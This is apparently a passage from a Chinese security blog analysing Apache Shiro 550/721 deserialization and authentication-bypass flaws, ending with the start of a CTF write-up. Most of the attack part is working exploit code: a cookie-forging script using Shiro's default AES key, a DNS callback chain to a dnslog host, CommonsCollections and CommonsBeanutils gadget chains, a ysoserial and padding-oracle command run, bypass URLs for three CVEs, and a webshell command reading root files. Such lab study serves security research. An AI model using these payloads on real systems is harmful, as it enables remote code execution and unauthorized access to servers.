<p>通过调试就可以发现最后的反序列化点到了DefaultSerializer的deserialize方法里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就可以发现调用了readObject方法</p>
<p>下面就可以先尝试dnslog链来执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dnslog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialized</span><span class="params">(Object oss)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dnslog1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(oss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://337kwi.dnslog.cn/&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.setInt(url, <span class="number">100</span>);</span><br><span class="line">        HashMap&lt;URL,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url,<span class="literal">null</span>);</span><br><span class="line">        hashCode.setInt(url, -<span class="number">1</span>);</span><br><span class="line">        serialized(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成的dnslog1.bin通过python脚本进行加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">def <span class="title function_">encode_rememberme</span><span class="params">(file)</span>:</span><br><span class="line">    f = open(file,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.<span class="type">block_size</span></span><br><span class="line">    <span class="variable">pad</span> <span class="operator">=</span> lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="type">bytes</span></span><br><span class="line">    <span class="variable">encryptor</span> <span class="operator">=</span> AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    file=input(<span class="string">&quot;请输入文件名&quot;</span>)</span><br><span class="line">    payload = encode_rememberme(file)</span><br><span class="line">    print(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro7.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/shiro8.png" width="95%" height="80%"></p>
<p>这里最后就可以去查看记录，发现成功触发</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>这里一般也是与其它依赖配合用的，首先打cc依赖，但是如果用常规的cc链的exp来打发现会出现问题,这里会显示无法加载类</p>
<p><img src="https://luokuang1.github.io/images/shiro9.png" width="95%" height="80%"></p>
<p>这里就直接分析原因了,在上面我们找到了反序列化的点，但是这里不是直接进行反序列化的，它是通过调用了ClassResolvingObjectInputStream的readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意一点，在反序列化中会自动的调用resolveClass来进行类加载，这里的ClassResolvingObjectInputStream就重写了resolveClass，里面和常规的resolveClass是由区别的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与ObjectInputStream类来进行比较，一般的类加载都是通过Class.forName来进行，所以就是这里的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进看ClassUtils.forName，这里进行了双亲委派的方式进行类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                    <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownClassException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里如果遇到数组就会进行报错加载不到，所以就需要通过没有数组的方式来打shiro,常规的方法就是通过commons-collections4的依赖打cc2链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        InvokerTransformer&lt;Object,Object&gt; invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator aaa=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(aaa);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c=invokerTransformer.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iMethodNam</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodNam.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodNam.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        serialize(priorityQueue,<span class="string">&quot;CC2.bin&quot;</span>);</span><br><span class="line">        unserialize(<span class="string">&quot;CC2.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro10.png" width="95%" height="80%"></p>
<p>这里也可以通过commons-collections3的依赖来打，需要通过多条链子来拼接实现，下面是exp文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">    bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">    Map&lt;Object,Object&gt; q= LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">    TiedMapEntry tiedmapentry=<span class="keyword">new</span>  <span class="title class_">TiedMapEntry</span>(q,templates);</span><br><span class="line">    HashMap&lt;Object,Object&gt; o = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    o.put(tiedmapentry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    Class c=q.getClass();<span class="comment">//反射来进行修改factory属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">LazyMapfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    LazyMapfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    LazyMapfactory.set(q,invokerTransformer);</span><br><span class="line">    q.remove(templates);</span><br><span class="line">    serialized(o,<span class="string">&quot;exp.bin&quot;</span>);</span><br><span class="line">    unserialized(<span class="string">&quot;exp.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>CB**</strong>链打shiro550**</p>
<p>在shiro550中是自带cb依赖的，所以可以直接通过CB链来打,成功命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);<span class="comment">//D://java/test.class</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">outputProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c=priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator1</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator1.set(priorityQueue, outputProperties);</span><br><span class="line">        serialized(priorityQueue,<span class="string">&quot;CB1.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;CB1.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro11.png" width="95%" height="80%"></p>
<h3 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h3><p>前置知识</p>
<p>在Shiro550后又出现了Shiro721,这个版本是在shiro550后面的升级版主要体现在对cookie的加密处理的问题上，Shiro550采用固定的key加密，而在721的版本里面所采用的是AES-128-CBC加密模式有办法直接进行伪造cookie值加密，并采用了PKCS#5的Padding模式，并且当存在一个有效身份认证时响应包里不会有rememberMe=deleteMe，但是当出现Padding错误时会出现，而Java的反序列化即使后面存在莫名奇妙的数据也不影响前面的反序列化，这就导致了如果在一个有效身份认证之后拼接一段数据，仍然能够成功认证，进而就意味着如果后面一段数据不满足Padding规则，就会出现deleteMe，满足则不出现。这样便符合了Padding-Oracle-Attack的条件，黑客能够通过这种攻击，构造明文为任意内容的密文，当然因为这里有反序列化，黑客自然会构造能够解密出恶意序列化Payload的密文</p>
<p>解密的流程图</p>
<p>先又一个初始化向量，将要解密的密文通过随机key进行加密，最后与初始化的向量进行异或</p>
<p><img src="https://luokuang1.github.io/images/shiro12.png" width="95%" height="80%"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">加密：(明文P ^ 前一组密文C0) -&gt; 中间值M - - -(块加密)- - -&gt; 本组密文C1</span><br><span class="line">解密: 本组密文C1 –(块解密)—&gt; 中间值M - - -(M ^ 前一组密文C0)- - -&gt; 本组明文P</span><br></pre></td></tr></table></figure>
<p>在Padding Oracle 规则里面有一个填充规则，在进行分组时，如果是按照八字节一组的话，如果一个组的数据不够八个的话就会进行填充0x01-0x08，刚好八个就再补一组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0x07</span> <span class="number">0x07</span> <span class="number">0x07</span> <span class="number">0x07</span> <span class="number">0x07</span> <span class="number">0x07</span> <span class="number">0x07</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0x06</span> <span class="number">0x06</span> <span class="number">0x06</span> <span class="number">0x06</span> <span class="number">0x06</span> <span class="number">0x06</span></span><br><span class="line">如果刚好为<span class="number">8</span>个字节</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span> <span class="number">0x08</span></span><br></pre></td></tr></table></figure>
<p>这样如果解密的结果最后面的不是和这里的规律就判断解码失败</p>
<p>系统判断解密是否成功的点是解密后明文点最后一位或者几位的值跟aes算法中的分组逻辑是否匹配，匹配才能解码成功</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">如果进行了明文填充，那么最后一位的值一定是小于<span class="number">0x08</span>且大于<span class="number">0x01</span>的。</span><br><span class="line">如果没有进行明文填充而直接额外加了一个组，那么最后一位的值一定是<span class="number">0x08</span>。</span><br></pre></td></tr></table></figure>
<p>系统也是通过最后一组的填充物来进行判断，如果满足就不会报错，否则就会报错</p>
<p>环境配置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inspiringz/Shiro-<span class="number">721.</span>git</span><br><span class="line">cd Shiro-<span class="number">721</span>/Docker</span><br><span class="line">docker build -t shiro-<span class="number">721</span> .</span><br><span class="line">docker run -p <span class="number">8080</span>:<span class="number">8080</span> -d shiro-<span class="number">721</span></span><br></pre></td></tr></table></figure>
<p>这里</p>
<p><img src="https://luokuang1.github.io/images/shiro13.png" width="95%" height="80%"></p>
<p>下面进行抓包处理</p>
<p><img src="https://luokuang1.github.io/images/shiro14.png" width="95%" height="80%"></p>
<p>通过脚本进行跑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/luokuang&quot;</span> &gt; payload.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">python2</span> shiro_exp.py http:<span class="comment">//192.168.1.4:8080/account/ tb8fuL5X0bMsugSunKfvTcFazFarSYApxv1uqaeF5oqK4KGJ/CLZSreLMvaDSiXgDglXXZmEVSS1QVemgazCMpk76FLbCTUEvXV/eCfO7TSlSsFdJHd8lAHAJnsUddgxgBYEA3IiF4eeTRroPo2T2C7t/IMNb4kQAioo80CFODzCPMuiFJ0uS0/Pjv7eVg7RDeNGeXnmXt8/CKnBNfRrWfSld2w7LQXPbSE25wglPa/op0Jct2SvXC3Br0m40Y8m0CmbkPH3zhPg33N7mGc9H8zzLhcNuohbmug9hlGDDKNO/RZe9fsad4ydxk/2MdY1eqPLdsxZfNqWfC5AAhE8OK0HLKr9iBB7MHZ3kmSnDhcyF1e0M7iOFixXERC/MkgnOfWBDwz+CjoRZBZS44cY0vdefMLh0sVz3yQ8q7yFNicwN59DzHql6mSW+OJfthPFdzJB3Io+nlY17numQNK1l8WvlmK7fUj9kVXhRfV7Wv1FEfQdXs2+yaoT9uo7SFNw  payload.class</span></span><br></pre></td></tr></table></figure>
<p>执行成功</p>
<p><img src="https://luokuang1.github.io/images/shiro15.png" width="95%" height="80%"></p>
<h3 id="shiro身份认证机制绕过"><a href="#shiro身份认证机制绕过" class="headerlink" title="shiro身份认证机制绕过"></a>shiro身份认证机制绕过</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CVE-<span class="number">2020</span>-<span class="number">1957</span></span><br><span class="line">客户端请求URL: /xxx/..;/admin/</span><br><span class="line">Shrio 内部处理得到校验URL为 /xxxx/..,校验通过</span><br><span class="line">SpringBoot 处理 /xxx/..;/admin/ , 最终请求 /admin/, 成功访问了后台请求。</span><br><span class="line">CVE-<span class="number">2020</span>-<span class="number">11989</span></span><br><span class="line">客户端请求URL: /;/test/admin/page</span><br><span class="line">Shrio 内部处理得到校验URL为/,校验通过</span><br><span class="line">SpringBoot最终请求 /admin/page, 成功访问了后台请求。</span><br><span class="line">CVE-<span class="number">2020</span>-<span class="number">13933</span></span><br><span class="line">客户端请求URL:/admin/;page</span><br><span class="line">Shrio 内部处理得到校验URL为/admin/,校验通过</span><br><span class="line">SpringBoot最终请求 /admin/;page, 成功访问了后台请求。</span><br></pre></td></tr></table></figure>
<p>主要是用到在apache与shiro对于url解析的差异</p>
<p>在shiro中处理url的方法是通过将;号表示结束，这里就导致一种解析差异，可以用于绕过，访问需要身份认证的路由</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/;/admin</span><br><span class="line">在shiro中只会解析为/，但是在apache处理时就会将/admin拼接到路由里面，导致直接访问/admin</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>WuCup 2024</title>
    <url>/2024/12/01/WuCup-2024/</url>
    <content><![CDATA[<h3 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h3><p>这个是一个签到题，题目直接给出一个webshell  passwd:sgin</p>
<p>下面就只需要post传sgin=system(‘cat /*’);即可</p>
<h3 id="HelloHacker"><a href="#HelloHacker" class="headerlink" title="HelloHacker"></a>HelloHacker</h3><p>直接给源码</p>
